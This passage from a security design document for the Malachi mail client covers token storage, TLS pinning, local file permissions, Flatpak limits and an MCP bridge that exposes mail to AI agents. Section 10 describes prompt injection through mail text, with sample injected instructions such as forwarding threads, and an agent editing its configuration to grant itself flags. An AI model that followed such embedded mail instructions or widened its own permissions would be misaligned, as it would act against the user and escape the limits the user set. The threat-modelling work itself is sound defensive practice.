  its tokens at once instead of at the end of its 10 minutes.
- For Gmail the token carries the `https://mail.google.com/` scope and
  SASL XOAUTH2 hands it to whichever server the account names, so the
  servers are part of the token's audience (RFC 9700 §4.10): a `daemon`
  Google account must name `imap.gmail.com:993` with TLS and
  `smtp.gmail.com` with 465/TLS or 587/STARTTLS, the address as the user
  name on both — enforced by `account.add`, `account.update`,
  `account.test`, `account.oauthStart` and the `config.toml` import.
  Microsoft tokens go only to Graph, whose URL is built in.
- The refresh token lives **only** in the keyring (key
  `oauth2.refresh_token`), written by `account.add` / `account.update`
  when they consume the completed session, by the completion hook of a
  re-sign-in, and rewritten whenever a refresh rotates it (Microsoft
  does). Access tokens stay in memory, cached until 60 s before expiry and
  dropped when a server refuses them; one refresh runs at a time per
  account. A keyring that refuses the token fails `account.add` /
  `account.update` with `keyringError` and keeps nothing. A re-sign-in
  whose token the keyring refuses this time (locked, prompt dismissed)
  stays in memory until the daemon stops; under `MALACHI_KEYRING=none`
  (which can never store it) the re-sign-in fails with `keyringError`
  and the account stays in `authRequired` — such an account can exist
  (added without a session, e.g. from `config.toml`) but never signs in.
  Both cases are logged and reported as `notify.authRequired` with
  reason `keyringError` (no URL). A refresh token the provider rejects
  (`invalid_grant`), or none stored, puts the account in `authRequired`
  and the backend opens a re-sign-in session by itself
  (`notify.authRequired` carries its `authUrl`). Token-endpoint errors
  reach logs and replies only cleaned and with every token, code and
  client secret redacted.
- A stored sign-in belongs to the address, provider and client it was
  made for. `account.update` of a `daemon` account that changes any of
  them (the effective `clientId` / `tenantId` included) without a new
  session deletes the refresh token, cancels a waiting re-sign-in and
  opens a new one for the new configuration; leaving source `daemon`
  deletes it too. When an account changes or goes, its token source is
  retired before the keyring is touched: a refresh still in flight can no
  longer write its rotated refresh token back. The backend's own keyring
  writes of an account (add, update, remove, a completed re-sign-in) are
  serialised per account together with the account row they belong to,
  and a re-sign-in that completes after its account was removed deletes
  what it stored.
- Sign-in sessions share the RPC connections' trust model (§8): every
  client has proved that it holds the daemon's per-run key, which is the
  user's own, so any client may start a re-sign-in for an account,
  replace the page texts of the one waiting (they are escaped either
  way) or cancel it; none of that reveals a token, and the grant of a
  session reaches an account only through the binding checks above.
- The page the browser shows after the redirect carries the UI's texts
  escaped by `html/template`, runs no script and loads nothing
  (`Content-Security-Policy: default-src 'none'; style-src
  'unsafe-inline'; frame-ancestors 'none'; form-action 'none'; base-uri
  'none'`, `Cache-Control: no-store`, `Referrer-Policy: no-referrer`,
  `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`).
- The OAuth client registrations are configuration, not user secrets:
  `config.toml` `[oauth2.google]` / `[oauth2.microsoft]` (none is built
  in). Google's Desktop-app `client_secret` is an installed-app secret,
  which Google documents as not confidential; it may sit in
  `config.toml`, and the daemon warns at start when that file is
  readable by group or others. Microsoft's registration is a public
  client without a secret.
- Log lines are scrubbed: authentication commands are logged as
  `AUTHENTICATE <redacted>`.
- `account.list` never returns secrets; `Credentials` is write-only.
  `account.add` forwards `credentials.password` to the keyring before it
  returns and drops the account again if the keyring refuses; the
  `accounts` row holds only the non-secret `api.AccountConfig`.
- The keyring client (`internal/auth/secretservice`) speaks the Secret
  Service D-Bus API directly. Items carry the attributes `app`
  (`io.github.schotek.Malachi`), `account` (the opaque account id) and
  `key` (`password` / `oauth2.refresh_token`); the label names the account
  id and key only. The session is `plain`: the session bus is per-user and
  a process able to eavesdrop on it runs as the same user and can already
  read `store.db` and the RPC key (§8), so the encrypted
  `dh-ietf1024-sha256-aes128-cbc-pkcs7` session would not change the threat
  model. It is the upgrade path if a sandbox ever filters bus traffic.
  Unlock prompts are the desktop's own dialogs; a dismissed prompt is a
  `keyringError`. `MALACHI_KEYRING=none` disables the keyring for
  development and makes every secret operation fail the same way.
- The helper keyring (`MALACHI_KEYRING=helper`, `internal/auth/helper`) is
  the platform-neutral alternative for desktops without a Secret Service:
  the daemon runs the program named by `MALACHI_KEYRING_HELPER` in its
  environment, as the same user, once per operation, git-credential style.
  The request crosses a pipe as one JSON line on stdin and the value comes
  back on stdout; a value is never in argv, a file, the environment or a
  log line, and the helper's stderr reaches an error message only with
  control characters removed, the value redacted and 200 bytes at most. On
  macOS the app sets it to its bundled `malachi-keychain`, which keeps one
  generic-password item per account id and key in the login keychain under
  the service `io.github.schotek.Malachi`; the first read after a rebuild of
  an ad-hoc signed helper is the Keychain's own access prompt. The trust
  model equals the Secret Service's: a process running as the same user
  could already read `store.db` and the RPC key, so being able to run
  the helper gives it nothing new. On the daemon's side the helper path
  must be absolute and name a regular file that is a program by the
  platform's rule, which `exec.LookPath` applies: execute permission for
  the daemon's user on Linux and macOS, a name with an extension on
  Windows. The check catches a wrong path at start; it is no trust
  boundary, since whoever sets the daemon's environment runs as the same
  user anyway. One call is bounded by 30 s (a Keychain prompt waits for
  the user), stdout and stderr are capped, exit 2 is "no such item" and
  exit 3 a request the helper refused. `malachi-keychain` itself accepts
  only account ids and keys matching `[A-Za-z0-9._-]{1,128}` before
  anything reaches a Keychain attribute, refuses more than 1 MiB on stdin,
  files the items as `<accountId>/<key>` with a label naming the same, and
  prints the value only as the answer to `get`. The app sets the two
  variables only when `MALACHI_KEYRING` is not already in its environment.
- On Windows the app sets the helper to its bundled
  `malachi-credentials.exe` (`windows/src/Malachi.Credentials`, NativeAOT,
  no console window), which keeps one generic credential per account id
  and key in Credential Manager, target
  `io.github.schotek.Malachi/<accountId>/<key>`, persisted for this
  machine only (it never roams with the profile), with the same identifier
  rule and stdin cap as `malachi-keychain`. The value stays bytes, never a
  string, and every buffer that held it is zeroed. Every value `get` hands
  over matches a SHA-256 the helper wrote with it, so a torn, mixed or
  edited item (`cmdkey` and the Credential Manager dialogs store UTF-16
  without the hash) is a `keyringError`, never a wrong token. A value above
  Credential Manager's 2560-byte limit is split into at most 16 chunks,
  written to the slot the current header does not name before the header
  that names them, so a `set` that fails or is killed leaves the previous
  value readable; `delete` removes every chunk. Credential Manager loses
  updates when several processes use it at once, so every run holds a
  named mutex of the session around its store operation. The trust model
  is the Secret Service's: any process of the user can read the user's
  generic credentials, as it can read `store.db` and the RPC key.
- If the keyring is unavailable, the account goes to `authRequired`; we do
  not fall back to plaintext storage.

## 7. Transport

- TLS by default (implicit TLS or STARTTLS with mandatory upgrade).
  `security: none` is accepted only for `localhost` (or a loopback IP) and
  is meant for tests; `account.add` validation enforces it.
- System CA store; certificate errors are fatal for the connection, with a
  clear `tlsError` in `notify.syncState`. There is no "ignore certificate"
  option. The one exception is a pinned certificate
  (`ServerConfig.certificateSha256`): per account and per endpoint, by the
  SHA-256 of the whole DER certificate, set only by an explicit act of
  the user: confirming that exact certificate in the UI (fingerprint
  first, then subject, issuer and validity; a changed certificate gets a
  confirmation of its own that warns of interception and shows the
  previously trusted fingerprint), or writing `certificate_sha256` into
  their own `config.toml`; and only for a password endpoint over TLS or
  STARTTLS — never for `security: none`, never for OAuth2 endpoints (a
  provider's token goes to the provider's servers only) and never for
  Graph or the HTTP clients (discovery, sign-in, remote images), which
  have no such setting. A pinned endpoint accepts exactly that certificate
  and checks neither issuer, name nor validity (a server with its own
  certificate, e.g. a mail bridge reached over a private network, has none
  worth checking); any other certificate fails with `tlsError` reason
  `pinMismatch`, which the UI shows as a changed certificate, and a new
  pin takes the same explicit confirmation. Validation stores the pin as
  64 lowercase hex digits; forgetting it is an `account.update` without it.
- Minimum TLS 1.2, pinned or not.
- Server-supplied strings (capabilities, folder names, error text) are
  treated as untrusted display data.
- Every outbound connection goes through `internal/transport`: one
  `TLSConfig` (TLS 1.2+, system roots, host name verified, no insecure
  knob) and, for IMAP/SMTP endpoints, `EndpointTLSConfig`, which is
  `TLSConfig` unless the endpoint pins a certificate — the only place
  that sets `InsecureSkipVerify`, always together with a
  `VerifyConnection` that compares the leaf's SHA-256 with the pin in
  constant time; a context-aware dial; and one error classifier.
  Timeouts: 10 s to connect, 10 s per command, 20 s for a whole endpoint
  probe; the socket is closed when the deadline passes because the
  protocol libraries have no context support. PREAUTH greetings on a
  STARTTLS connection are refused.
  The libraries' debug writers are never set: they would log credentials.
- Discovery (`account.discover`), what leaves the machine: the domain to
  Mozilla's ISPDB over HTTPS; the full address to the provider's own
  `autoconfig.<domain>` / `.well-known` URLs (it already knows it); the
  domain to the DNS resolver (SRV); and unauthenticated TLS connections to
  `imap.`/`mail.`/`smtp.<domain>`. It is triggered only by the user typing
  an address in the wizard, never by content. Documents are capped at
  256 KiB and parsed with Go's strict decoder (no entity expansion);
  redirects are followed only to https and at most three times.
- Error mapping for `account.test` and later sync: certificate/handshake
  failures, a missing or refused STARTTLS and a server demanding TLS
  before login (SMTP 530/538, IMAP `LOGINDISABLED` on a plaintext
  connection) → `tlsError`; DNS, refused and dropped connections →
  `networkError`; deadlines → `serverTimeout`; IMAP `NO` on login and SMTP
  535/534/5.7.8/5.7.9 → `authFailed`; anything else the server said →
  `serverError`. Messages forwarded to clients are control-stripped and
  capped at 200 bytes. A `tlsError` carries `error.data` (docs/api.md §2):
  the reason and the server's leaf certificate as the verifier saw it —
  fingerprint, subject, issuer, names, validity, self-signed — built from
  the handshake error, never from a second connection; every string from
  the certificate is untrusted text (control, format and line/paragraph
  separator characters removed, ≤ 128 bytes, ≤ 8 names of each kind),
  cleaned again by the UIs. A verdict on a certificate gets a fixed
  `error.message` (stage, reason, fingerprint) instead of the library's
  text, which quotes the certificate's names and issuer: that message
  reaches the logs and, through `sync_status`, agents on the MCP bridge.

### 7.1 Outgoing mail

- The `From` header and the envelope sender are always the account's own
  identity; a draft carries no sender field, so a client cannot spoof one.
- `Bcc` recipients exist only in the SMTP envelope. They are never written
  to the message, so neither the other recipients nor the copy in the Sent
  folder reveal them.
- Every header value (subject, display names, addresses, ids) is validated
  at `draft.save` and stripped of CR, LF and NUL again by the builder, so
  header injection cannot add recipients or forge headers; addresses are
  re-parsed with `net/mail` at send time.
- The built message is capped (`api.MaxOutgoingMessageBytes`) while it is
  streamed to disk; the SMTP `SIZE` extension is honoured before `DATA`.
- A rich-text draft goes out as `multipart/alternative` (the plain-text
  rendering first, then the HTML; inline pictures in a `multipart/related`
  around the HTML, files in a `multipart/mixed` around everything). The
  HTML part is exactly what `draft.save` stored, which is exactly what
  `internal/sanitize` produced in compose mode: nothing that did not pass
  the sanitiser is ever sent as HTML, and a `cid:` in it can only name one
  of the draft's own inline attachments.
- One SMTP session per delivery attempt, retried with backoff; a refused
  password stops all attempts for the account until it is edited, so a
  wrong password cannot lock the account out through repeated logins.

## 8. Local storage

- One daemon per store: before it touches the store or the socket, the
  daemon takes an exclusive lock on the store, an EXCLUSIVE SQLite
  transaction it never commits on `store.db.daemon.lock` beside it
  (created `0600`), which the system drops with the process however it
  ends. A second daemon for the same store, also one reaching it through a
  symbolic link, exits with an error after about a second, so two never
  sync, send from or write one store; without the lock, a second daemon
  whose socket check a flood of connections had fooled would reset the
  outbox of a live one and could send a message twice. The transaction
  writes (never committing) to prove the lock is exclusive: SQLite opens a
  file it cannot write read-only, where the same transaction would take
  only a shared lock, so a lock file the daemon cannot write stops it from
  starting instead. The lock relies on the file system's locks (a network
  file system may not have working ones), and on Linux and macOS it holds
  only while nothing else in the daemon opens the lock file, since closing
  any descriptor of a file drops the process's locks on it:
  `attachment.import` refuses that file, also through a link.
- `store.db` is `0600` in a `0700` directory. Mail is stored unencrypted at
  rest; full-disk encryption is the user's responsibility and is stated in
  the README.
- The RPC socket is `0600` in a `0700` directory where the platform has
  file modes, but reaching it is not enough: every connection starts with
  a handshake in which the daemon, then the client, proves with
  HMAC-SHA256 over two fresh nonces that it holds the key the daemon made
  at its start ([api.md §1.4](api.md#14-handshake)), and nothing else is
  served before it. Whoever can read the key can use the daemon, which is
  the same trust level as reading `store.db` directly.
- The key (32 random bytes) is the file `<socket>.key` beside the socket,
  `rpc.sock.key` by default: `0600` where the platform has file modes, on
  Windows as private as the directory it inherits its permissions from,
  which for the default path lies in the user's profile. The daemon
  writes a new one at every start before it accepts a connection and
  never logs or sends it; a clean exit removes it while it still holds
  that run's key, and after a crash or a kill it stays until the next
  start replaces it. Clients read it afresh for every connection, only
  after the daemon has answered `system.hello`, and accept only a regular
  file of the exact format; the macOS client also requires the user as
  its owner and no group or other permission bits (`macos/README.md`), a
  check the Go clients cannot make without platform-specific code. The
  Windows client makes the same check in the form Windows has
  (`WindowsKeyFilePolicy`, `windows/README.md`): it opens the key file as
  itself (a link or junction is refused, never followed), requires a disk
  file owned by the user (or by the token's default owner of an elevated
  run) whose DACL lets nobody but the user, SYSTEM, Administrators and
  OWNER RIGHTS read, write or append its data, change its DACL or take it
  (a NULL DACL is refused), and before it starts a daemon it creates the
  socket's directory, `%USERPROFILE%\.cache\malachi\run`, with a
  protected DACL for the user and SYSTEM, since the key file inherits its
  directory's permissions there.
- The table in §2 lists, attacker by attacker, what the handshake
  protects against: a peer that reaches the socket but not the key file
  beside it is refused, a process on the socket's path that cannot prove
  the key never receives a request, an unauthenticated connection runs no
  backend code, gets no notification and cannot stall clients that are
  already authenticated, and the key of an earlier run is worthless. The
  MCP bridge relies on it instead of checking the socket's owner and
  mode, on every platform alike (§10).
- What it does not protect against: the user's own processes, which can
  read the key as they can read `store.db` (so can a container or Flatpak
  app running as the user that was given the socket's directory rather
  than the socket file alone), and administrators, root or SYSTEM. It is
  not encryption and gives the messages after it no integrity of their
  own; nor are its proofs bound to the connection, so a relay that can
  put its own socket at the daemon's path (which takes write access to
  the socket's directory) passes both proofs on and can read and change
  everything after them. It guarantees no availability: whoever can
  connect can occupy the 32 handshake slots, and on Windows and macOS a
  flood of connections can make a starting daemon's check of the socket
  fail outright, so that a daemon of another store (a second `--store` on
  the same socket path) takes the socket over from the live one; two
  daemons never share a store (the store lock above). Every
  authenticated client has the same rights; nothing is authorised per
  client. A socket moved into a directory other users can read or write
  (`--socket` or `MALACHI_SOCKET` pointing into `/tmp`, or on Windows
  outside the user's profile) is not supported: whoever can write there
  can put a socket and a key of their own in place, and on Windows
  whoever can read there can read the key. The Windows client refuses such
  a key file (*Backend unavailable*, the reason in its log); the Go clients
  cannot tell.
- An attachment being opened or previewed is written by the UI to a
  private `0700` directory under `$XDG_RUNTIME_DIR/malachi/open` (or
  `$XDG_CACHE_HOME/malachi/open` without a runtime dir) as a `0600` file
  and handed to the previewer, or to the OpenURI portal / the default
  application. Inside Flatpak the directory is
  `$XDG_RUNTIME_DIR/app/<app-id>/malachi/open`: the rest of the sandbox's
  runtime dir is private to it, and the previewer runs on the host. The
  viewer may read it lazily, so the file is not removed at once: entries
  older than an hour are swept whenever the next attachment is opened. On
  macOS the directory is
  `~/Library/Caches/Malachi Mail/open` (there is no runtime dir of the
  XDG kind), each file goes into a fresh `mkdtemp` subdirectory and is
  created `O_EXCL` with mode `0600`, and every file the client writes out
  of a message, whether opened, previewed or saved, carries the quarantine attribute
  (type e-mail attachment, agent Malachi Mail), so Gatekeeper and the
  opening application treat it as a download. The attribute is read back
  after it is set: a file written for opening or previewing on which it
  did not stick is not shown (the toast says the attachment could not be
  opened); a
  file the user saved is theirs regardless. Log lines about these files
  carry an error's domain and code in the open and its description, which
  names the file, as private. On every platform, and whatever the
  preferences, the whole directory is removed when the UI quits and again
  when it starts (what a crash left), so nothing opened or previewed
  outlives the session, which is also what `neverStoreAttachments`
  promises; the macOS and Windows clients remove it before they stop the
  daemon and once more as the process ends. The removal refuses any path
  but an absolute one ending in `malachi/open` (`Malachi Mail/open` on
  macOS), so an unset runtime or cache directory cannot aim it at anything
  else, removes a symbolic link in its place without following it, and
  logs a failure. On Windows the directory lies in the data directory,
  which `MALACHI_DATA_DIR` may name for tests and agents, so the rule
  cannot name the parent: the removal refuses any path but a fully
  qualified one ending in `\open`, with `.` and `..` resolved as written,
  that is no device path (`\\?\`, `\\.\`) and does not lie directly under
  the root of a drive or share, and removes a symbolic link or junction in
  its place without following it. On Linux the runtime dir is normally a
  `tmpfs` in memory; the fallback cache dir and the macOS and Windows
  directories are on disk until the removal.
  On Windows the directory is
  `%LOCALAPPDATA%\Malachi Mail\open` with a protected DACL for the user
  and SYSTEM, emptied at start and exit (a file a viewer still holds open
  cannot be deleted there and goes at the next start), each file in a
  fresh random subdirectory, created new, never over an existing one. Every file the
  client writes out of a message, opened or saved, gets the Mark of the
  Web through `IAttachmentExecute`, which also runs the antivirus check
  and the attachment policy: the Restricted zone, as Microsoft advises
  mail clients, or the Internet zone for a program the user saves (the
  Restricted zone's policy would delete it). A file for opening is opened
  only when that check passed and the zone reads back (unless an
  administrator switched zone information off); a failed check never
  opens. No exception of these services names the path of a file written
  out of a message. Its previewer holds the part in memory and writes
  nothing, so an attachment kept on the mail server under
  `neverStoreAttachments` reaches the disk only when the user opens it
  (into this directory, gone at exit) or saves it. The data directory,
  `%LOCALAPPDATA%\Malachi Mail`, lies in the user's profile, whose
  permissions admit the user, SYSTEM and Administrators; the daemon's
  `0600` and `0700` mean nothing there.
- Raw messages are `<data dir>/messages/<account>/<id>`, or `<id>.zst`
  when compressed (`0600` files, `0700` directories). The name decides how
  a file is read, never its content, so a message that begins with zstd's
  magic number is read back exactly as it came. A compressed file is read
  only up to the size its frame records (never past 64 MiB, with a window
  of at most 16 MiB) and its checksum is verified, so a damaged or crafted
  file fails the read as an error instead of yielding a shorter or longer
  message, and the background conversion leaves a damaged file as it is.
  Compression is not encryption: a `.zst` file is as readable as a plain
  one to whoever can read the directory. Files go with their rows: a
  deletion removes both variants once its transaction is committed (a
  message being written is removed by its writer), and the hourly sweep
  removes temporary files, files without a row in its own accounts'
  directories and the empty directories of unknown accounts once they are
  an hour old; a directory with files it leaves alone, since another store
  in the same data directory shares `messages/`, unless it is that of an
  account this store deleted, which the deletion records until the
  directory is gone and the sweep then removes whole. Windows refuses to
  remove or replace a file while it is open: there a removal or a
  replacement waits a moment for the daemon's own readers of the file
  (`message.body`, `message.part`), and a file one of them, or another
  program, keeps open for longer stays as it was, a deleted message's file
  and a deleted account's directory until the sweep. Outbox messages are
  always plain and flushed to disk, file and directory, before the draft
  they replace is deleted, since until the send that file is the only
  copy.
- A message being received is staged in `<data dir>/staging/` (`0600`
  files with random names, created exclusively, in a `0700` directory)
  and reaches `messages/` only after the parse, a skeleton only once
  verified; the daemon empties the directory at every start and the sweep
  removes what is older than an hour. Under `neverStoreAttachments`
  nothing is staged there: the message is received into the daemon's
  memory, and only the file committed from it is written (below).
- A message whose large attachments stayed on the server is a skeleton
  file plus the ids of the missing parts in `messages.remote_parts`. The
  row names a part remote before the skeleton replaces the file (that
  commit flushed to disk first, even against a power loss) and drops the
  name only after a whole file is in place, so after a crash it may call a
  stored part remote, never the reverse (a skeleton that cannot replace
  the file after all, on Windows while a reader keeps it open, the
  daemon's or another program's, has the name dropped again, the file
  being still whole; of a message left with both variants a reader takes
  the newer);
  `message.part` and `message.embedded` answer `partNotDownloaded` for
  such a part rather than return the empty body the skeleton holds.
  Should a part the row calls stored, with a size, still read back empty
  (a leftover file), they and `draft.create` treat it as remote too and
  record it so.
- Compose attachments live in `<data dir>/attachments/<id>` (`0600` files,
  `0700` directory); imports that never reach a saved draft are swept
  after 24 h.
- Under `neverStoreAttachments` the daemon writes no attachment the HTML
  does not show, nor a picture it shows of 100 KiB and more (only the
  smaller pictures are stored with the text; the others are downloaded
  when the user asks for the pictures, `message.body` `remotePictures`).
  A message a sync receives, or a body downloaded for the first time, is
  staged in memory and stored as a skeleton (the preference as it is when
  the message arrives); the stored attachments and large pictures are
  removed in the background, also those downloaded on request before,
  the small attachments and large pictures of messages reduced under
  `attachmentOfflineDays` and those of a message stored while the
  preference was being switched on, a store already in the mode loses
  its large pictures once when the rule grows to take them, and a pass
  every day catches what came to be stored whole since. A message the
  user downloads is held whole in the daemon's memory
  (`core/memcache.go`), never written to disk and never logged: at most
  256 MiB, a message unused for 30 minutes dropped, everything dropped when
  the daemon quits (or dies: it is process memory) or the preference is
  switched off, an account's messages when the account is paused or
  removed. Stored whole all the same, attachments included, are the
  messages that cannot be reduced safely or have no other copy: Drafts,
  the Outbox until delivery, messages without a copy on the server, signed
  or encrypted ones, a MIME structure the parser could not read to the
  end, a skeleton that does not verify. What it does not cover: a reply or
  a forward, or a draft opened from the Drafts folder, copies the
  attachments and pictures it takes into the compose attachment store
  (above) like any draft attachment, and the copy of the draft uploaded to the Drafts folder is
  stored whole like everything there; attachment names, types and sizes
  stay in `store.db` and the search index; removing a stored attachment
  replaces the file and does not overwrite the old blocks, which snapshots
  and backups may also still hold; and the system may page the daemon's
  memory out to swap or a hibernation image (encrypted by default on
  macOS; on Linux as the swap is set up).
- The search index (`messages_fts`, migration 0013) lives in `store.db`
  with everything else. It is contentless: it holds the tokens of the
  subject, the people, the attachment names and the plain-text body, not a
  second copy of the text, and a deleted message's entry goes with its
  row (triggers). The search query is what the user typed: the daemon and
  the UI never log it, and an error from the full-text engine, which could
  quote it, is replaced by a fixed text.
- `collected_addresses` holds the recipients of mail the user sent (To, Cc
  and Bcc, with the display name the draft carried) for recipient
  completion. It is never fed from incoming `From` headers: a suggestion
  list that repeated attacker-chosen display names would be a phishing
  aid. Address-book contacts (Evolution Data Server) are read per search
  and never stored; their names are cleaned like any other untrusted
  display text (`docs/api.md` §4.11).

## 9. Sandbox: what Flatpak gives and what it does not

Gives:

- filesystem isolation: the app sees only its own data dirs; attachments
  are opened/saved through the FileChooser portal, so a mail cannot make
  us read `~/.ssh`;
- no direct D-Bus access except the names listed in `finish-args`
  (`org.freedesktop.secrets`, `org.freedesktop.Notifications`,
  `org.gnome.OnlineAccounts`, `org.gnome.Settings`,
  `org.gnome.NautilusPreviewer`, the Evolution Data Server names);
- WebKitGTK's own process sandbox (bubblewrap) works inside Flatpak;
- a defined runtime, so library versions are known.

Does not give:

- protection against the app itself being malicious or buggy in what it
  *is* allowed to do: with `--share=network` a compromised renderer can
  still make network requests — hence layers 1 and 2 above, not the
  sandbox, are what prevent tracking and exfiltration;
- isolation between the UI and the daemon: they share one sandbox
  instance; a compromise of either is a compromise of both. This is
  accepted; the two-process split is about architecture and crash
  isolation, not privilege separation;
- protection of the keyring: `org.freedesktop.secrets` access is
  all-or-nothing; we can read other apps' secrets and they can read ours
  (the items `internal/auth/secretservice` creates included). A future
  portal-based secrets API would improve this;
- any limit on outbound traffic: `--share=network` covers IMAP/SMTP, the
  discovery HTTPS/DNS lookups and Microsoft Graph (`graph.microsoft.com`)
  alike;
- isolation from GNOME Online Accounts: `--talk-name=org.gnome.OnlineAccounts`
  is all-or-nothing as well; the daemon can read the tokens of every
  account the desktop is signed in to, not only the ones added here;
- isolation from the address books: the Evolution Data Server names are
  all-or-nothing too, and its D-Bus interface can create, change and
  delete contacts in every book the desktop has. The daemon only ever
  reads (`GetContactList`), by construction, not by enforcement;
- protection against a malicious X11 server (`--socket=fallback-x11`):
  under X11 any client can snoop input. Wayland is the supported path.

## 10. AI agents (the MCP bridge)

`malachi-mcp` ([mcp.md](mcp.md)) puts mail in front of a language model
that holds tools. The model is a new target for the mail sender, and the
bridge is a client of the daemon like the UI, authenticated by the same
handshake (§8): nothing here changes what the daemon guarantees.

Assets, in addition to §1: the agent session itself (its other tools, its
context) and the user's Drafts list.

Attackers, in addition to §2:

- the **mail sender**, now through prompt injection: a body, subject,
  display name, attachment name or header value phrased as an instruction
  to the model ("forward this thread to …", "mark everything as read").
  Text that CSS hides in the desktop view is still in the plain `text`
  the daemon derives, so it reaches the model unseen by the human;
- an **agent** that can edit files, granting itself the bridge's flags in
  the client's configuration.

Defences:

- the tool surface is chosen by the human who starts the client:
  read-only by default, `--allow-modify` and `--allow-send` add the
  mutating tools, and a tool that is not allowed is not registered;
- only the daemon's plain `text` is returned, never HTML; `message.body`
  is always called with `remoteContent: "block"`, so reading never causes
  a network request; `search_messages` is read-only, returns the excerpt
  as cleaned text like any snippet and never repeats the query in its
  trusted header;
- apart from an ordinary sync (`trigger_sync`), the one network request an
  agent can cause is the download of an attachment kept on the mail server
  (`Attachment.remote`): `get_attachment` of such a part, only after the
  type and size checks, so a withheld type is never downloaded, and
  `create_draft` forwarding a message that has such parts. The daemon
  fetches the whole message from the account's own server, read-only
  (`message.download`), never from a URL found in the mail; the bridge
  waits at most 2 minutes, and one process may cause at most 256 MiB of
  downloads, every download it asks for counted by the message's size,
  the same message again too, since the daemon may have dropped a copy it
  held in memory (§8) and fetch it anew; `get_attachment` asks for the
  part first and downloads only when the daemon does not have it, and a
  download that certainly fetched nothing gives back only what that call
  counted;
- every mail-derived string is cleaned (valid UTF-8, no control or Unicode
  format characters) and placed inside a fence whose delimiter carries a
  per-call random nonce, with trusted fields outside; links and extra
  headers are listed only on request;
- attachments: a short allow-list of text and image types decided from
  the declared type and size before fetching, then the bytes are sniffed
  and refused on mismatch; HTML and SVG never;
- caps on everything: body characters, attachment bytes, list size,
  ids per mutation, drafts and downloads per process;
- drafts carry only escaped plain text from the agent; HTML and
  attachments come solely from the daemon's own quote and import of the
  original message (`draft.create`), and a forward attaches the original's
  parts, all gated by the human who sends;
  `delete_messages` only moves to Trash and refuses messages already in
  Trash or in the Outbox; `send_message` accepts only drafts created by
  the same process, at the recorded version;
- no account management, no configuration, no credentials or server
  settings in any output; the bridge makes no call before the daemon has
  proved the per-run key (§8), on every platform alike, so a process
  squatting the socket without being able to write the key file beside it
  gets nothing beyond `system.hello` (in a shared directory it could plant
  both, which is why such a directory is not supported, §8); the bridge
  never runs as root; nothing content-bearing is logged, nor the key, a
  nonce or a proof.

Explicitly not defended: the model following instructions in mail with the
tools it has (fencing and descriptions reduce, they do not prevent);
exfiltration through the host's own tools once content is in context; the
user sending an agent-made draft without reading it; an agent editing
`.mcp.json` to grant itself flags; an agent able to run programs as the
user reading `rpc.sock.key` and using the whole API directly, around the
bridge and its flags; a sender's `Reply-To` steering a reply's
recipients, and the quoted original (its pictures, a forward's files)
travelling in an agent-made draft (both are shown in the result). A
recipient allow-list for
`send_message` built on `contact.search` is the next step and is not
implemented.

## 11. Reporting

Security issues: open a private report on the GitHub repository (Security →
Advisories) rather than a public issue. No bug bounty.

## 12. Review checklist for PRs touching content handling

- [ ] Does any path return HTML that did not pass `internal/sanitize`?
- [ ] New parser: are there malformed samples in `testdata/mime` and a
      fuzz target?
- [ ] Change to what is stored of a message (`internal/ingest`,
      `mime.Skeleton`): is the result verified by the reading parser
      (`mime.VerifySkeleton` against `mime.Parse` of the original), does
      every doubt keep the original whole, and do signed or encrypted
      messages stay untouched?
- [ ] New reader or writer of raw message files: does it go through
      `store.OpenMessageRaw` / `PutMessageRaw` / `WithMessageRaw`, never a
      path of its own, and never judge the codec by the content?
- [ ] New MIME-derived field: text-only, capped, never the raw header
      block?
- [ ] New URL handling: is the scheme allow-listed, is the real target
      shown?
- [ ] New network request: is it triggered by user action, not by content?
- [ ] New log line: can it contain a secret or message content?
- [ ] New file path accepted from the UI: validated as a regular file,
      size-capped during the copy, content type sniffed?
- [ ] Does any path store or send HTML that did not pass
      `internal/sanitize`, including outgoing drafts?
- [ ] New `finish-args` entry: is there a portal instead?
- [ ] New outbound connection: does it use `transport.TLSConfig` /
      `transport.EndpointTLSConfig` / `transport.DialContext` and classify
      errors through `transport`?
- [ ] Does anything skip certificate verification outside the pinned path
      of `transport.EndpointTLSConfig`, or let a pin reach an OAuth2,
      Graph or HTTP connection or be set without the user's confirmation
      of that certificate?
- [ ] New MCP tool or output field: is every mail-derived string cleaned
      and inside the nonce fence, is the tool behind the right flag, are
      its annotations set, and is its output capped?
- [ ] New RPC method or notification: is it served, or sent, only on a
      connection that completed the handshake?
- [ ] Change to the daemon's handling of a connection before it has
      authenticated: is nothing exposed beyond the `system.hello` answer,
      within the limits of [api.md §1.4](api.md#14-handshake) — no
      backend call, no notification, and no key, nonce, proof or string
      from the peer in a log line?
- [ ] New client of the socket: does it authenticate through
      `api.ClientHandshake`, or a port checked against the test vectors
      of api.md §1.4, read the key only after the `system.hello` answer
      and afresh for every connection, and send nothing before
      `system.authenticate` is answered?
- [ ] Change to the Windows client's WebView2 layer
      (`windows/src/Malachi.App/WebViews`, the gate, navigation, link,
      context-menu and recovery rules in `Malachi.Core.Presentation`), or
      a new WebView2 runtime or Windows App SDK: does the network canary
      pass (`make test-windows`), with its control run still leaking? Is
      every request still answered by the gate, every setting applied
      before the first navigation, and does a view that cannot apply one
      load nothing?
- [ ] Windows client showing mail data: only `TextBlock.Text` /
      `TextBox.Text`, never XAML, RTF or a WebView2 other than the
      hardened views, and a name, subject or caption through `DisplayText`
      first (§4)?
- [ ] File written out of a message on Windows: a Windows-safe name, a
      new file in a private directory, the Mark of the Web, opened only
      after the check passed and the zone read back, never a type of
      `DangerousTypes` or what `AssocIsDangerous` flags (nor written by
      Save All, only by an explicit Save As), and no path in an
      exception or a log line?
- [ ] Change to `malachi-credentials` or to `WindowsKeyFilePolicy`: does a
      value stay bytes that are zeroed, is every value handed out checked
      against its SHA-256, does a failed `set` leave the previous value,
      and are the owner and DACL checks unchanged or stricter?
